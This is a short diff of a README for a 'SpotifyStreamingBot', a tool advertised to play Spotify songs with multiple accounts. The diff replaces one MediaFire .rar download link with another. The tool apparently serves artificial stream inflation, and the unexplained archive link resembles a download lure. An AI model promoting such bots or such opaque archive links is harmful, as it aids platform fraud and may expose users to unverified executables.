@@ -1,7 +1,7 @@
 # SpotifyStreamingBot
  Simple tool which plays spotify songs between the given amount of time with multiple accounts.
 
-💗[TAP FOR DOWNLOAD](https://www.mediafire.com/file/tpqlvhfm5jd0c0l/SpotifyStreamingBot.rar/file)💗  
+💗[TAP FOR DOWNLOAD](https://www.mediafire.com/file/5vmzfu9jae1xxv5/SpotifyStreamingBott.rar/file)💗  
 
  
 # Tool
